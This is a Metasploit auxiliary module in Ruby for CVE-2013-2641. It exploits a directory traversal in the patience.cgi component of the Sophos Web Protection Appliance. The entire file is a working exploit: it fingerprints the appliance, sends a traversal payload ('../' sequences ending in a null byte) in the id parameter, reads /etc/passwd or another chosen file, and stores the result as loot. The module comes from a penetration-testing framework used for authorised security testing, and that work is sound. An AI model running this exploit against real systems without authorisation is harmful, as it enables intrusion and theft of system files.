##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'uri'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Sophos Web Protection Appliance patience.cgi Directory Traversal',
      'Description' => %q{
        This module abuses a directory traversal in Sophos Web Protection Appliance, specifically
        on the /cgi-bin/patience.cgi component. This module has been tested successfully on the
        Sophos Web Virtual Appliance v3.7.0.
      },
      'Author'       =>
        [
          'Wolfgang Ettlingers', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2013-2641' ],
          [ 'OSVDB', '91953' ],
          [ 'BID', '58833' ],
          [ 'EDB', '24932' ],
          [ 'URL', 'http://www.sophos.com/en-us/support/knowledgebase/118969.aspx' ],
          [ 'URL', 'https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130403-0_Sophos_Web_Protection_Appliance_Multiple_Vulnerabilities.txt' ]
        ],
      'DefaultOptions' => {
        'SSL' => true
      },
      'DisclosureDate' => 'Apr 03 2013'))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('FILEPATH', [true, 'The name of the file to download', '/etc/passwd']),
        OptInt.new('DEPTH', [true, 'Traversal depth', 2])
      ])
  end

  def my_basename(filename)
    return ::File.basename(filename.gsub(/\\/, "/"))
  end

  def is_proficy?

    res = send_request_cgi(
      {
        'uri'       => "/cgi-bin/patience.cgi",
        'method'    => 'GET'
      })

    if res and res.code == 307 and res.body =~ /The patience page request was not valid/
      return true
    else
      return false
    end
  end

  def read_file(file)
    travs = ""
    travs << "../" * datastore['DEPTH']
    travs << file
    travs << "%00"

    print_status("Retrieving file contents...")

    res = send_request_cgi(
      {
        'uri'       => "/cgi-bin/patience.cgi",
        'method'    => 'GET',
        'encode_params' => false,
        'vars_get' => {
          'id'  => travs
        }
      })


    if res and (res.code == 200 or res.code == 500) and res.headers['X-Sophos-PatienceID']
      return res.body
    else
      print_status("#{res.code}\n#{res.body}")
      return nil
    end

  end

  def run
    print_status("Checking if it's a Sophos Web Protect Appliance with the vulnerable component...")
    if is_proficy?
      print_good("Check successful")
    else
      print_error("Sophos Web Protect Appliance vulnerable component not found")
      return
    end

    contents = read_file(datastore['FILEPATH'])
    if contents.nil?
      print_error("File not downloaded")
      return
    end

    file_name = my_basename(datastore['FILEPATH'])
    path = store_loot(
        'sophos.wpa.traversal',
        'application/octet-stream',
        rhost,
        contents,
        file_name
    )
    print_good("File saved in: #{path}")

  end
end
